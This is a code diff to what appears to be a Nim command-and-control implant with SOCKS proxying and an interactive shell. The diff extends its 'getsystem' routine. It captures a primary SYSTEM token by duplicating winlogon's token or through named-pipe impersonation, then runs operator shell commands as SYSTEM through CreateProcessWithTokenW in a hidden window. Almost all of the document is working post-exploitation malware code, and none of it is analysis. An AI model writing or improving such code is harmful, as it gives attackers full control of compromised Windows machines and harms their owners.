@@ -38,6 +38,24 @@ var gSocksStop   {.volatile.}: bool = true
 when defined(windows):
   const THREAD_SET_CONTEXT_FLAG: DWORD = 0x0010
 
+  # Primary SYSTEM token stored by getsystem; used by runShell via
+  # CreateProcessWithTokenW so shell commands run as SYSTEM regardless
+  # of which thread dispatches them (thread impersonation is per-thread).
+  var gSystemToken: HANDLE = 0
+
+  proc CreateProcessWithTokenW(
+    hToken: HANDLE, dwLogonFlags: DWORD,
+    lpApplicationName: LPCWSTR, lpCommandLine: LPWSTR,
+    dwCreationFlags: DWORD, lpEnvironment: pointer,
+    lpCurrentDirectory: LPCWSTR, lpStartupInfo: ptr STARTUPINFOW,
+    lpProcessInformation: ptr PROCESS_INFORMATION
+  ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}
+
+  proc OpenThreadToken(
+    ThreadHandle: HANDLE, DesiredAccess: DWORD,
+    OpenAsSelf: WINBOOL, TokenHandle: ptr HANDLE
+  ): WINBOOL {.importc, stdcall, dynlib: "advapi32".}
+
   var gIshellProc:    HANDLE = 0
   var gIshellStdinW:  HANDLE = 0
   var gIshellStdoutR: HANDLE = 0
@@ -86,10 +104,40 @@ proc extractFilename(path: string): string =
 proc runShell*(cmd: string): string =
   try:
     when defined(windows):
+      if gSystemToken != 0:
+        let fullCmd = "cmd.exe /s /c \"" & cmd & "\""
+        var hRead, hWrite: HANDLE
+        var sa: SECURITY_ATTRIBUTES
+        sa.nLength = DWORD(sizeof(sa)); sa.bInheritHandle = WINBOOL(1)
+        if CreatePipe(addr hRead, addr hWrite, addr sa, 0) == 0:
+          return "[error: CreatePipe]"
+        discard SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0)
+        var si: STARTUPINFOW; zeroMem(addr si, sizeof(si))
+        si.cb = DWORD(sizeof(si))
+        si.dwFlags = STARTF_USESTDHANDLES
+        si.hStdOutput = hWrite; si.hStdError = hWrite
+        si.hStdInput = INVALID_HANDLE_VALUE
+        var pi: PROCESS_INFORMATION; zeroMem(addr pi, sizeof(pi))
+        let ok = CreateProcessWithTokenW(gSystemToken, 0, nil,
+          newWideCString(fullCmd), CREATE_NO_WINDOW, nil, nil, addr si, addr pi)
+        discard CloseHandle(hWrite)
+        if ok == 0:
+          discard CloseHandle(hRead)
+          return "[error: CreateProcessWithTokenW " & $GetLastError() & "]"
+        var buf = newStringOfCap(4096)
+        var tmp = newString(512)
+        var nr: DWORD
+        while ReadFile(hRead, addr tmp[0], DWORD(512), addr nr, nil) != 0 and nr > 0:
+          buf.add(tmp[0 ..< int(nr)])
+        discard WaitForSingleObject(pi.hProcess, 60000)
+        discard CloseHandle(hRead)
+        discard CloseHandle(pi.hProcess); discard CloseHandle(pi.hThread)
+        return buf
       let (output, _) = execCmdEx("cmd.exe /s /c \"" & cmd & "\"")
+      return output
     else:
       let (output, _) = execCmdEx("/bin/sh -c " & quoteShell(cmd))
-    return output
+      return output
   except: return "[error: " & getCurrentExceptionMsg() & "]"
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -735,12 +783,17 @@ when defined(windows):
       var hTok: HANDLE
       if OpenProcessToken(hProc, TOKEN_DUPLICATE, addr hTok) == 0: break t1
       defer: discard CloseHandle(hTok)
-      var hDup: HANDLE
+      var hPrim, hDup: HANDLE
+      discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
+        securityImpersonation, tokenPrimary, addr hPrim)
       discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
         securityImpersonation, tokenImpersonation, addr hDup)
-      if hDup == 0: break t1
-      if ImpersonateLoggedOnUser(hDup) == 0: discard CloseHandle(hDup); break t1
+      if hDup == 0: (if hPrim != 0: discard CloseHandle(hPrim)); break t1
+      if ImpersonateLoggedOnUser(hDup) == 0:
+        discard CloseHandle(hDup); (if hPrim != 0: discard CloseHandle(hPrim)); break t1
       discard CloseHandle(hDup)
+      if gSystemToken != 0: discard CloseHandle(gSystemToken)
+      gSystemToken = hPrim
       return "[+] T1 SYSTEM (winlogon PID=" & $sysPid & ")"
 
     # ── T2: Named pipe impersonation via service (overlapped, 15s timeout) ─
@@ -789,6 +842,16 @@ when defined(windows):
 
     if ImpersonateNamedPipeClient(hPipe) == 0:
       return "[-] T1+T2 failed (ImpersonateNamedPipeClient err " & $GetLastError() & ")"
+    block storeT2:
+      var hThr: HANDLE = 0
+      if OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE or TOKEN_ALL_ACCESS,
+          WINBOOL(0), addr hThr) != 0:
+        var hPrim: HANDLE = 0
+        discard DuplicateTokenEx(hThr, TOKEN_ALL_ACCESS, nil,
+          securityImpersonation, tokenPrimary, addr hPrim)
+        discard CloseHandle(hThr)
+        if gSystemToken != 0: discard CloseHandle(gSystemToken)
+        gSystemToken = hPrim
     return "[+] T2 SYSTEM (named pipe + service)"
 
   # ── Token Store ──────────────────────────────────────────────────────────────
